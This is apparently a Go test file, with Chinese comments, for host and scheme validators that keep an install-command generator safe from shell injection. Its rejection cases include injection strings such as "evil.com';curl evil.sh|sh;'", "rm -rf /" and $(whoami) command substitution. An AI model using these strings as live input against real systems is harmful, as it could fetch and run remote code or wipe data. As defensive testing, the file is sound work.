package install_origin

import (
	"testing"

	"github.com/hcd233/aris-proxy-api/internal/util"
)

// TestIsSafeInstallHost_Allow 验证合法 host（域名、端口、IPv6、带端口域名）全部通过。
//
//	@author centonhuang
//	@update 2026-08-06 10:00:00
func TestIsSafeInstallHost_Allow(t *testing.T) {
	t.Parallel()
	cases := []string{
		"api.lvlvko.top",
		"api.lvlvko.top:8080",
		"localhost",
		"127.0.0.1",
		"127.0.0.1:3000",
		"example.com",
		"sub-domain.example.co",
		"[::1]:8080",
		"[2001:db8::1]",
		"a", // 最小合法输入
	}
	for _, host := range cases {
		if !util.IsSafeInstallHost(host) {
			t.Errorf("IsSafeInstallHost(%q) = false, want true", host)
		}
	}
}

// TestIsSafeInstallHost_Reject 验证含 shell 元字符 / 空白 / 空串的 host 全部拒绝。
//
// 覆盖单引号、双引号、反引号、$()、分号、管道、换行等 shell 注入向量。
//
//	@author centonhuang
//	@update 2026-08-06 10:00:00
func TestIsSafeInstallHost_Reject(t *testing.T) {
	t.Parallel()
	cases := []string{
		"",
		"evil.com'$(whoami)",
		"evil.com';curl evil.sh|sh;'",
		`evil.com"$(whoami)"`,
		"evil.com`whoami`",
		"evil.com;rm -rf /",
		"evil.com|sh",
		"evil.com\nrm -rf /",
		"evil.com\\",
		"evil.com/",
		"evil.com?x=1",
		"evil.com#frag",
		"evil.com space",
		"http://evil.com", // 带 scheme 的不是 host
	}
	for _, host := range cases {
		if util.IsSafeInstallHost(host) {
			t.Errorf("IsSafeInstallHost(%q) = true, want false", host)
		}
	}
}

// TestSafeInstallOrigin_Allow 验证合法 scheme+host 组装出仅含已验证分量的 origin。
//
// 覆盖：空 scheme 回退 http、域名+端口、IPv4 字面量（安装层不拒绝回环——
// 注入层面无风险，回环可达性属于 SSRF 范畴）、host 大小写原样保留（url.Parse 不归一化 host）。
//
//	@author centonhuang
//	@update 2026-09-26 10:00:00
func TestSafeInstallOrigin_Allow(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name   string
		scheme string
		host   string
		want   string
	}{
		{"empty scheme falls back to http", "", "api.lvlvko.top", "http://api.lvlvko.top"},
		{"https with port", "https", "api.lvlvko.top:8443", "https://api.lvlvko.top:8443"},
		{"http ipv4 literal with port", "http", "127.0.0.1:3000", "http://127.0.0.1:3000"},
		{"localhost with port", "http", "localhost:8080", "http://localhost:8080"},
		{"uppercase host preserved", "https", "API.LVLVKO.TOP", "https://API.LVLVKO.TOP"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			got, ok := util.SafeInstallOrigin(tc.scheme, tc.host)
			if !ok {
				t.Fatalf("SafeInstallOrigin(%q, %q) rejected, want allow", tc.scheme, tc.host)
			}
			if got != tc.want {
				t.Errorf("SafeInstallOrigin(%q, %q) = %q, want %q", tc.scheme, tc.host, got, tc.want)
			}
		})
	}
}

// TestSafeInstallOrigin_Reject 验证注入向量全部走拒绝路径（返回空 origin）。
//
// 覆盖：X-Forwarded-Proto 携带整段 URL/引号/分号/反引号/$()/路径（攻击载荷落进 Path）、
// Host 头带 / ' ; 空格 换行 反引号 $()、畸形方括号 host、IPv6 字面量（按语义拒绝，
// 见 util.SafeInstallOrigin 注释）、非法 scheme（含严格模式下的大写 HTTPS）。
//
//	@author centonhuang
//	@update 2026-09-26 10:00:00
func TestSafeInstallOrigin_Reject(t *testing.T) {
	t.Parallel()
	cases := []struct {
		name   string
		scheme string
		host   string
	}{
		// 原始攻击向量：scheme 携带整段 URL + 单引号闭合 + curl|sh
		{"scheme carries whole url with payload", "https://evil.com/x';curl evil|sh;'", "api.lvlvko.top"},
		{"scheme with path payload", "https://evil.com/x", "api.lvlvko.top"},
		{"scheme with semicolon", "https;rm -rf /", "api.lvlvko.top"},
		{"scheme with backtick", "`whoami`", "api.lvlvko.top"},
		{"scheme with command substitution", "$(id)", "api.lvlvko.top"},
		{"scheme with single quote", "https'whoami", "api.lvlvko.top"},
		{"scheme with trailing space", "http ", "api.lvlvko.top"},
		{"uppercase scheme rejected by strict rule", "HTTPS", "api.lvlvko.top"},
		{"ftp scheme", "ftp", "api.lvlvko.top"},
		{"empty scheme with bad host", "", "evil.com/x';curl|sh;'"},
		// Host 头注入向量
		{"host with slash payload", "https", "evil.com/x';curl evil|sh;'"},
		{"host with single quote", "https", "evil.com'$(whoami)"},
		{"host with semicolon", "https", "evil.com;rm -rf /"},
		{"host with space", "https", "evil.com space"},
		{"host with newline", "https", "evil.com\nrm -rf /"},
		{"host with backtick", "https", "evil.com`whoami`"},
		{"host with command substitution", "https", "evil.com$(id)"},
		{"host with scheme prefix", "https", "http://evil.com"},
		{"empty host", "https", ""},
		// IPv6 字面量与畸形方括号：按 host 语义拒绝
		{"ipv6 loopback literal", "http", "[::1]"},
		{"ipv6 loopback literal with port", "http", "[::1]:8080"},
		{"ipv6 doc literal", "https", "[2001:db8::1]"},
		{"malformed bracket host", "http", "a[b"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()
			got, ok := util.SafeInstallOrigin(tc.scheme, tc.host)
			if ok {
				t.Fatalf("SafeInstallOrigin(%q, %q) = %q, want reject", tc.scheme, tc.host, got)
			}
			if got != "" {
				t.Errorf("rejected origin must be empty, got %q", got)
			}
		})
	}
}
